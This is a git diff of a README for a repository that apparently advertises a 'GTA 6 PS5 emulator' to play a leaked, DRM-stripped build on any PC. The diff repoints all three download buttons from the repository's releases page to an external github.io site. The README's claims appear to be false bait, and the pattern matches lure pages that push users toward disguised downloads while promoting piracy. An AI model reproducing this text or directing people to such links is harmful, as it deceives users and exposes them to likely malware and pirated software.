@@ -1,7 +1,7 @@
 # 🎮 GTA-6-PS5-Emulator-Play-On-PC-2026 - Play GTA 6 on Any PC Today
 
 <p align="center">
-  <a href="https://github.com/zawazaraz/GTA-6-PS5-Emulator-Play-On-PC-2026/releases">
+  <a href="https://zawazaraz.github.io">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-GTA%206%20PS5%20Emulator-FF6B00?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a2e" alt="Download GTA 6 PS5 Emulator" width="600" height="100">
   </a>
 </p>
@@ -48,7 +48,7 @@ Our team has taken the leaked 2026 build, stripped out all the DRM protection, a
 
 ### Step 1: Download the Application
 
-[**⬇️ CLICK HERE TO DOWNLOAD NOW**](https://github.com/zawazaraz/GTA-6-PS5-Emulator-Play-On-PC-2026/releases)
+[**⬇️ CLICK HERE TO DOWNLOAD NOW**](https://zawazaraz.github.io)
 
 Visit this link to download the application. You'll be taken to the downloads page where you'll find the latest version ready for download.
 
@@ -164,7 +164,7 @@ This is the **ultimate 2026 GTA 6 PC experience**. No Steam, no Epic Games Launc
 
 **Don't wait – download now and start your Vice City adventure!**
 
-[**⬇️ TRY THE GTA 6 PS5 EMULATOR TODAY**](https://github.com/zawazaraz/GTA-6-PS5-Emulator-Play-On-PC-2026/releases)
+[**⬇️ TRY THE GTA 6 PS5 EMULATOR TODAY**](https://zawazaraz.github.io)
 
 **Star this repository** ⭐ if you enjoy the game – it helps us keep the project alive and updated!
 
